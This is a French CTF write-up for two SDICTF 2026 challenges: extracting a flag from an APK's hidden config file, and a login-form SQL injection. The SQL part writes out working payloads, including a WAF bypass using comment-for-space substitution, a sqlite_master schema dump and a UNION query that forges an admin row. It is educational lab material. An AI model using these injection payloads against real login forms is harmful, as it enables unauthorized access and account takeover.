# 🛡️ SDICTF ESATIC 2026 – Write-ups

Auteur : **5yn0r**  
Année : 2026  
Événement : CTF organisé par le **C2E à la SDI** de l'**ESATIC**

Ce dépôt contient les solutions détaillées de deux challenges du SDICTF 2026 :

- 📱 **Gestionnaire Pro** (Mobile / Reverse Engineering)
- 🌐 **La Porte Dérobée** (Web / SQLi)

---

## 🔐 1. Gestionnaire Pro – APK Analysis

| Catégorie      | Mobile / Reverse Engineering |
|----------------|------------------------------|
| Difficulté     | Medium                       |
| Auteur         | Raphael                      |
| Format         | APK                          |
| Flag           | `SDICTF{XXXXXXXXXXXXXXXXXX}` |

### 📌 Résumé

L’APK `gestionnaire.apk` contient un fichier de configuration sensible mal dissimulé dans les assets. Une simple extraction permet d’obtenir le flag.

### 🔍 Méthodologie

1. **Analyse initiale** avec `strings` → détection d’un fichier `.backup_config`
2. **Extraction** de l’APK :
   ```bash
   unzip gestionnaire.apk -d gestionnaire_extract
   ```
3. **Exploration** des fichiers extraits :
   ```bash
   cd gestionnaire_extract/assets
   cat .backup_config
   ```
4. **Flag** trouvé en clair dans la configuration de sauvegarde.

### Conclusion

> Mauvaise pratique de build : inclusion d’un fichier de configuration interne dans l’APK publié.

---

## 🌍 2. La Porte Dérobée – Web SQLi

| Catégorie       | Web / SQLi                   |
|----------------|-------------------------------|
| Difficulté     | Medium                        |
| Auteur         | Raphael                       |
| Format         | Formulaire de connexion       |
| Flag           | `SDICTF{XXXXXXXXXXXXXXXXXXX}` |

### 📌 Résumé

Un formulaire de connexion vulnérable à une injection SQL UNION avec WAF. Contournement possible grâce aux commentaires `/*/`.

### 🔍 Méthodologie

1. **Test basique** : `admin' OR '1'='1' -- -` → bloqué par WAF
2. **Bypass du WAF** avec `/*/` pour éviter la détection des espaces :
   ```sql
   username=' UNION/**/SELECT 1,2,3,4 -- -
   ```
3. **Détermination du nombre de colonnes** : 4
4. **Extraction de la structure** :
   ```sql
   username=' UNION/**/SELECT 1,SQL,3,4 FROM sqlite_master -- -
   ```
   → Table `users` avec colonnes `id, username, password, role`
5. **Injection d’un utilisateur admin factice** :
   ```sql
   username=' UNION/**/SELECT 1,'admin','fake','admin' -- -
   ```

### Conclusion

> Contournement de WAF par commentaires SQL, UNION-based SQLi sur SQLite, injection d’un rôle administrateur.

---

## Licences

Ce travail est mis à disposition sous licence **MIT** pour le code et **CC BY-NC-SA 4.0** pour les write-ups.

- Vous êtes libre de partager et adapter ces write-ups à des fins non commerciales, avec mention de l’auteur.
- Le code d’exploitation éventuel peut être réutilisé librement dans un cadre légal.

### 🧑‍💻 Auteur

**5yn0r** – [GitHub](https://github.com/5yn0r)

---

## ⭐ Remerciements

Merci au **C2E de l’ESATIC** et aux parrains **Raphael DAMO & Modeste AKAFFOU** - [GitHub](https://github.com/modesteakaffou) pour ces challenges instructifs.


